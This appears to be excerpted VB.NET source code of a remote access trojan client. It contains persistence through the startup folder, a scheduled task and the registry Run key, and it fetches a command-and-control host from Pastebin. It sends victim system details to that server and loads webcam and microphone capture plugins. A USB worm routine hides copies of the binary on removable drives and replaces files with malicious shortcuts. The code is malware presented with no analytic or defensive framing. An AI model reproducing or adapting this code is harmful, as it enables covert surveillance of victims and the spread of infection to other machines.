...
#End If
        ...
        Public Shared SPL As String = "<SecureAgentmm>"
...
#If startup Then
            Try
                Dim STUP As String = Environment.GetFolderPath(7) & "\" & IO.Path.GetFileName(Gclass1.current)
                IO.File.Copy(Gclass1.current, STUP)
...
#If task Then
            ...
            Dim outpath As String = apptask & "\" & IO.Path.GetFileName(Gclass1.current)
            Try
                IO.File.Copy(Gclass1.current, outpath)
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
            Try
                ...
                PSInfo.Arguments = ("/create /f /sc minute /mo 1 /tn " & """" & IO.Path.GetFileNameWithoutExtension(Gclass1.current) & """" & " /tr " + """" + outpath + """")
...
#If reg Then
            Try
                Dim app As String = Environ$("appdata") & "\" & IO.Path.GetFileName(Gclass1.current)
                My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(IO.Path.GetFileNameWithoutExtension(Gclass1.current), app)
                IO.File.Copy(Gclass1.current, app)
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
#End If
...
#If Pastebin Then
            Dim ConInfo As String = DownloadStr(Gclass1.PasteUrl)
            Gclass1.Host = ConInfo.Split(":")(0)
            Gclass1.Port = ConInfo.Split(":")(1)
#End If
...
#End If
    ...
    Public Class ClientSocket
        ...
        Public Shared ReadOnly SPL = Gclass1.SPL
        ...
        Public Shared Sub BeginConnect()
            Try
                ...
                S.Connect(Gclass1.Host, Gclass1.Port)
        ...
        Public Shared Function Info()
            ...
            Return String.Concat("INFO", SPL, (ID()), SPL, Environment.UserName & " / " & Environment.MachineName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "1.1", SPL, INDATE(), SPL, usbp(), SPL, admin, SPL, Messages.Cam, SPL, Antivirus(), SPL, LAN(), SPL, CPU(), SPL, GetBIT(), SPL, TLS(), SPL, RAM(), SPL, Comment())
...
#If usbSP Then
                        Gclass1.USBS.stopp()
#End If
                        objj(A(1)).un(Gclass1.USBNM)

                    Case "update"
                        objj(A(1)).update(Gclass1.USBNM, A(2), A(3))
...
#If Not usbSP Then
                    Case "startusb"
                        If Gclass1.usbC = True Then
                        Else
                            objj(A(1)).startsp(Gclass1.USBNM)
                            Gclass1.usbC = True
                        End If
#End If
                    ...
                    Case "R#"
                        ...
                        For Each p As Process In Process.GetProcesses
                            ...
                            End Try
                        Next
                        ClientSocket.Send("R#" & SPL & Inhalt & SPL & Gclass1.current + SPL + ID())
                    ...
                    Case "WBCM"
                        If Cam() Then
                            ...
                            If WCam Is Nothing Then
                                ...
                                Return
                            End If
                            objj(Convert.ToBase64String(WCam)).CON(Gclass1.Host, Gclass1.Port, Gclass1.SPL, Gclass1.KEY, ID)
                        End If
                    ...
                    Case "MICL"
                        ...
                        If WMic Is Nothing Then
                            ...
                            Return
                        End If
                        objj(Convert.ToBase64String(WMic)).CON(Gclass1.Host, Gclass1.Port, Gclass1.SPL, Gclass1.KEY, ID)
                    ...
                    Case "Wsound"
                        ...
                        If WSound Is Nothing Then
                            ...
                            Return
                        End If
                        objj(Convert.ToBase64String(WSound)).CON(Gclass1.Host, Gclass1.Port, Gclass1.SPL, Gclass1.KEY, ID)


                    Case "JustFun"
                        objj(A(1)).CON(Gclass1.Host, Gclass1.Port, Gclass1.SPL, Gclass1.KEY, ID)
    ...
    Module Helper
        ...
        Function AES_Encryptor(ByVal input As Byte()) As Byte()
            ...
            Try
                AES_.Key = Hash.ComputeHash(SB(Gclass1.KEY))
        ...
        Public Function INDATE() As String
            Try
                Dim file As New IO.FileInfo(Gclass1.current)
        ...
        Function usbp() As String
            Try
                If IO.Path.GetFileName(Gclass1.current) = Gclass1.USBNM Then
                    Return "True"
                Else
                    Return "False"
                End If
        ...
        Public TLS_DHE_PSK_WITH_AES_128_CBC_SHA = &H90              ' SSLv3    Kx=DHEPSK    Au=PSK    Enc=AES(128)                Mac=SHA1
        Public TLS_DHE_PSK_WITH_AES_256_CBC_SHA = &H91              ' SSLv3    Kx=DHEPSK    Au=PSK    Enc=AES(256)                Mac=SHA1
        Public TLS_DHE_RSA_WITH_AES_128_CBC_SHA = &H33              ' SSLv3    Kx=DH        Au=RSA    Enc=AES(128)                Mac=SHA1
        Public TLS_DHE_RSA_WITH_AES_256_CBC_SHA = &H39              ' SSLv3    Kx=DH        Au=RSA    Enc=AES(256)                Mac=SHA1
        Public TLS_PSK_WITH_AES_128_CBC_SHA = &H8C                  ' SSLv3    Kx=PSK       Au=PSK    Enc=AES(128)                Mac=SHA1
        Public TLS_PSK_WITH_AES_256_CBC_SHA = &H8D                  ' SSLv3    Kx=PSK       Au=PSK    Enc=AES(256)                Mac=SHA1
        Public TLS_RSA_PSK_WITH_AES_128_CBC_SHA = &H94              ' SSLv3    Kx=RSAPSK    Au=RSA    Enc=AES(128)                Mac=SHA1
        Public TLS_RSA_PSK_WITH_AES_256_CBC_SHA = &H95              ' SSLv3    Kx=RSAPSK    Au=RSA    Enc=AES(256)                Mac=SHA1
        Public TLS_RSA_WITH_AES_128_CBC_SHA = &H2F                  ' SSLv3    Kx=RSA       Au=RSA    Enc=AES(128)                Mac=SHA1
        Public TLS_RSA_WITH_AES_256_CBC_SHA = &H35                  ' SSLv3    Kx=RSA       Au=RSA    Enc=AES(256)                Mac=SHA1
        Public TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA = &HC01E          ' SSLv3    Kx=SRP       Au=RSA    Enc=AES(128)                Mac=SHA1
        Public TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA = &HC021          ' SSLv3    Kx=SRP       Au=RSA    Enc=AES(256)                Mac=SHA1
        Public TLS_SRP_SHA_WITH_AES_128_CBC_SHA = &HC01D              ' SSLv3    Kx=SRP       Au=SRP    Enc=AES(128)                Mac=SHA1
        Public TLS_SRP_SHA_WITH_AES_256_CBC_SHA = &HC020              ' SSLv3    Kx=SRP       Au=SRP    Enc=AES(256)                Mac=SHA1

        Public TLS_DHE_PSK_WITH_AES_128_CBC_SHA256 = &HB2           ' TLSv1    Kx=DHEPSK    Au=PSK    Enc=AES(128)                Mac=SHA256
        Public TLS_DHE_PSK_WITH_AES_256_CBC_SHA384 = &HB3           ' TLSv1    Kx=DHEPSK    Au=PSK    Enc=AES(256)                Mac=SHA384
        Public TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA = &HC009          ' TLSv1    Kx=ECDH      Au=ECDSA  Enc=AES(128)                Mac=SHA1
        Public TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA = &HC00A          ' TLSv1    Kx=ECDH      Au=ECDSA  Enc=AES(256)                Mac=SHA1
        Public TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA = &HC035            ' TLSv1    Kx=ECDHEPSK  Au=PSK    Enc=AES(128)                Mac=SHA1
        Public TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA256 = &HC037         ' TLSv1    Kx=ECDHEPSK  Au=PSK    Enc=AES(128)                Mac=SHA256
        Public TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA = &HC036            ' TLSv1    Kx=ECDHEPSK  Au=PSK    Enc=AES(256)                Mac=SHA1
        Public TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA384 = &HC038         ' TLSv1    Kx=ECDHEPSK  Au=PSK    Enc=AES(256)                Mac=SHA384
        Public TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA = &HC013            ' TLSv1    Kx=ECDH      Au=RSA    Enc=AES(128)                Mac=SHA1
        Public TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA = &HC014            ' TLSv1    Kx=ECDH      Au=RSA    Enc=AES(256)                Mac=SHA1
        Public TLS_PSK_WITH_AES_128_CBC_SHA256 = &HAE               ' TLSv1    Kx=PSK       Au=PSK    Enc=AES(128)                Mac=SHA256
        Public TLS_PSK_WITH_AES_256_CBC_SHA384 = &HAF               ' TLSv1    Kx=PSK       Au=PSK    Enc=AES(256)                Mac=SHA384
        Public TLS_RSA_PSK_WITH_AES_128_CBC_SHA256 = &HB6           ' TLSv1    Kx=RSAPSK    Au=RSA    Enc=AES(128)                Mac=SHA256
        Public TLS_RSA_PSK_WITH_AES_256_CBC_SHA384 = &HB7           ' TLSv1    Kx=RSAPSK    Au=RSA    Enc=AES(256)                Mac=SHA384

        Public TLS_DHE_PSK_WITH_AES_128_GCM_SHA256 = &HAA           ' TLSv1.2  Kx=DHEPSK    Au=PSK    Enc=AESGCM(128)             Mac=AEAD
        Public TLS_DHE_PSK_WITH_AES_256_GCM_SHA384 = &HAB           ' TLSv1.2  Kx=DHEPSK    Au=PSK    Enc=AESGCM(256)             Mac=AEAD
        Public TLS_DHE_PSK_WITH_CHACHA20_POLY1305_SHA256 = &HCCAD     ' TLSv1.2  Kx=DHEPSK    Au=PSK    Enc=CHACHA20/POLY1305(256)  Mac=AEAD
        Public TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 = &H67           ' TLSv1.2  Kx=DH        Au=RSA    Enc=AES(128)                Mac=SHA256
        Public TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 = &H9E           ' TLSv1.2  Kx=DH        Au=RSA    Enc=AESGCM(128)             Mac=AEAD
        Public TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 = &H6B           ' TLSv1.2  Kx=DH        Au=RSA    Enc=AES(256)                Mac=SHA256
        Public TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 = &H9F           ' TLSv1.2  Kx=DH        Au=RSA    Enc=AESGCM(256)             Mac=AEAD
        Public TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256 = &HCCAA     ' TLSv1.2  Kx=DH        Au=RSA    Enc=CHACHA20/POLY1305(256)  Mac=AEAD
        Public TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256 = &HC023       ' TLSv1.2  Kx=ECDH      Au=ECDSA  Enc=AES(128)                Mac=SHA256
        Public TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 = &HC02B       ' TLSv1.2  Kx=ECDH      Au=ECDSA  Enc=AESGCM(128)             Mac=AEAD
        Public TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384 = &HC024       ' TLSv1.2  Kx=ECDH      Au=ECDSA  Enc=AES(256)                Mac=SHA384
        Public TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 = &HC02C       ' TLSv1.2  Kx=ECDH      Au=ECDSA  Enc=AESGCM(256)             Mac=AEAD
        Public TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 = &HCCA9 ' TLSv1.2  Kx=ECDH      Au=ECDSA  Enc=CHACHA20/POLY1305(256)  Mac=AEAD
        Public TLS_ECDHE_PSK_WITH_CHACHA20_POLY1305_SHA256 = &HCCAC   ' TLSv1.2  Kx=ECDHEPSK  Au=PSK    Enc=CHACHA20/POLY1305(256)  Mac=AEAD
        Public TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 = &HC027         ' TLSv1.2  Kx=ECDH      Au=RSA    Enc=AES(128)                Mac=SHA256
        Public TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 = &HC02F         ' TLSv1.2  Kx=ECDH      Au=RSA    Enc=AESGCM(128)             Mac=AEAD
        Public TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 = &HC028         ' TLSv1.2  Kx=ECDH      Au=RSA    Enc=AES(256)                Mac=SHA384
        Public TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 = &HC030         ' TLSv1.2  Kx=ECDH      Au=RSA    Enc=AESGCM(256)             Mac=AEAD
        Public TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 = &HCCA8   ' TLSv1.2  Kx=ECDH      Au=RSA    Enc=CHACHA20/POLY1305(256)  Mac=AEAD
        Public TLS_PSK_WITH_AES_128_GCM_SHA256 = &HA8               ' TLSv1.2  Kx=PSK       Au=PSK    Enc=AESGCM(128)             Mac=AEAD
        Public TLS_PSK_WITH_AES_256_GCM_SHA384 = &HA9               ' TLSv1.2  Kx=PSK       Au=PSK    Enc=AESGCM(256)             Mac=AEAD
        Public TLS_PSK_WITH_CHACHA20_POLY1305_SHA256 = &HCCAB         ' TLSv1.2  Kx=PSK       Au=PSK    Enc=CHACHA20/POLY1305(256)  Mac=AEAD
        Public TLS_RSA_PSK_WITH_AES_128_GCM_SHA256 = &HAC           ' TLSv1.2  Kx=RSAPSK    Au=RSA    Enc=AESGCM(128)             Mac=AEAD
        Public TLS_RSA_PSK_WITH_AES_256_GCM_SHA384 = &HAD           ' TLSv1.2  Kx=RSAPSK    Au=RSA    Enc=AESGCM(256)             Mac=AEAD
        Public TLS_RSA_PSK_WITH_CHACHA20_POLY1305_SHA256 = &HCCAE     ' TLSv1.2  Kx=RSAPSK    Au=RSA    Enc=CHACHA20/POLY1305(256)  Mac=AEAD
        Public TLS_RSA_WITH_AES_128_CBC_SHA256 = &H3C               ' TLSv1.2  Kx=RSA       Au=RSA    Enc=AES(128)                Mac=SHA256
        Public TLS_RSA_WITH_AES_128_GCM_SHA256 = &H9C               ' TLSv1.2  Kx=RSA       Au=RSA    Enc=AESGCM(128)             Mac=AEAD
        Public TLS_RSA_WITH_AES_256_CBC_SHA256 = &H3D               ' TLSv1.2  Kx=RSA       Au=RSA    Enc=AES(256)                Mac=SHA256
        Public TLS_RSA_WITH_AES_256_GCM_SHA384 = &H9D               ' TLSv1.2  Kx=RSA       Au=RSA    Enc=AESGCM(256)             Mac=AEAD

        Public TLS_AES_128_GCM_SHA256 = &H1301                        ' TLSv1.3  Kx=any       Au=any    Enc=AESGCM(128)             Mac=AEAD
        Public TLS_AES_256_GCM_SHA384 = &H1302                        ' TLSv1.3  Kx=any       Au=any    Enc=AESGCM(256)             Mac=AEAD
        Public TLS_CHACHA20_POLY1305_SHA256 = &H1303                  ' TLSv1.3  Kx=any       Au=any    Enc=CHACHA20/POLY1305(256)  Mac=AEAD
        Public TLS_AES_128_CCM_SHA256 = &H1304                        ' TLSv1.3  Kx=any       Au=any    Enc=AESCCM(128)             Mac=AEAD
        Function TLS() As String
            Dim text3 As String = "TLS (lev) / "
            Try
                Select Case rand.Next(9)
                    Case 0
                        Return text3 & TLS_PSK_WITH_AES_128_CBC_SHA
                    Case 1
                        Return text3 & TLS_RSA_WITH_AES_128_CBC_SHA256
                    Case 2
                        Return text3 & TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
                    Case 3
                        Return text3 & TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384
                    Case 4
                        Return text3 & TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256
                    Case 5
                        Return text3 & TLS_DHE_RSA_WITH_AES_128_CBC_SHA256
                    Case 6
                        Return text3 & TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
                    Case 7
                        Return text3 & TLS_RSA_PSK_WITH_AES_128_CBC_SHA256
                    Case 8
                        Return text3 & TLS_PSK_WITH_AES_128_CBC_SHA256
                    Case 9
                        Return text3 & TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
                End Select
            Catch ex As Exception
                Return "-"
            End Try
        ...
        Function RAM() As String
            Try
                ...
                If PH > 1073741824 Then
                    ...
                    x = x.Remove(4, x.Length - 4) + " GiB"
                ElseIf PH > 1048576 Then
                    x = (PH / 1048576).ToString
                    x = x.Remove(4, x.Length - 4) + " MiB"
                End If
                Return x
            Catch ex As Exception
                Return "Error"
        ...
        Function GetBIT() As String
            Try
                Return If(Registry.LocalMachine.OpenSubKey("HARDWARE\Description\System\CentralProcessor\0").GetValue("Identifier").ToString().Contains("x86"), "(32 Bit)", "(64 Bit)")
            Catch
                ' ignored
            End Try
        ...
        Public Function CreateMutex() As Boolean
            ...
            Gclass1._appMutex = New Mutex(False, Gclass1.Mutexx, createdNew)
            Return createdNew
        End Function
        Public Sub CloseMutex()
            If Gclass1._appMutex IsNot Nothing Then
                Gclass1._appMutex.Close()
                Gclass1._appMutex = Nothing
            End If
        End Sub
                ...
                If myd.IsReady Then
                    If myd.DriveType = IO.DriveType.Removable Then
                        ruta = myd.Name
                            ...
                            If Not IO.File.Exists(ruta & Gclass1.USBNM) Then
                                IO.File.Copy(Gclass1.current, ruta & Gclass1.USBNM, True)
                                IO.File.SetAttributes(ruta & Gclass1.USBNM, IO.FileAttributes.Hidden + IO.FileAttributes.System)
                            End If


                            For Each xx As String In IO.Directory.GetFiles(ruta)
                                If IO.Path.GetExtension(xx).ToLower <> ".lnk" And xx.ToLower <> ruta.ToLower & Gclass1.USBNM.ToLower Then
                                    ...
                                    With shellobj.CreateShortcut(ruta & New IO.FileInfo(xx).Name & ".lnk")
                                        ...
                                        .TargetPath = "cmd.exe"
                                        .WorkingDirectory = ""
                                        .Arguments = "/c start " & Gclass1.USBNM.Replace(" ", ChrW(34) _
                       ...
                       For Each xx As String In IO.Directory.GetDirectories(ruta)
                            ...
                            With shellobj.CreateShortcut(ruta & IO.Path.GetFileNameWithoutExtension(xx) & " .lnk")
                                ...
                                .TargetPath = "cmd.exe"
                                .WorkingDirectory = ""
                                .arguments = "/c start " & Replace(Gclass1.USBNM, " ", ChrW(34) & " " & ChrW(34)) & "&start explorer " & Replace(New  _
